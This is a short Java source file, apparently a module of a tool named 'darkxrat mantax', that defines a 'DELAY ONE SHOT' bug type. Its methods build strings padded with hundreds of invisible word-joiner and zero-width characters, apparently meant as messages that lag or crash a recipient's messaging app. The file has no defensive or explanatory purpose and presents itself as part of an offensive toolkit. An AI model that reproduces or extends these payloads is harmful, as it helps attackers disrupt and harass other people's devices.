package com.darkxrat.mantax.func.bug;

public class DelayOneShot {
    public static final String NAMA = "DELAY ONE SHOT";
    public static final String TIPE = "BUG";

    public static String func() {
        return "\u2060".repeat(50) + "DELAY_ONE_SHOT" + "\u2060".repeat(50);
    }

    public static String funcHard() {
        return "\u2060".repeat(100) + "DELAY_ONE_SHOT_HARD" + "\u2060".repeat(100);
    }

    public static String funcUltra() {
        return "\u2060".repeat(200) + "DELAY_ONE_SHOT_ULTRA" + "\u2060".repeat(200);
    }

    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}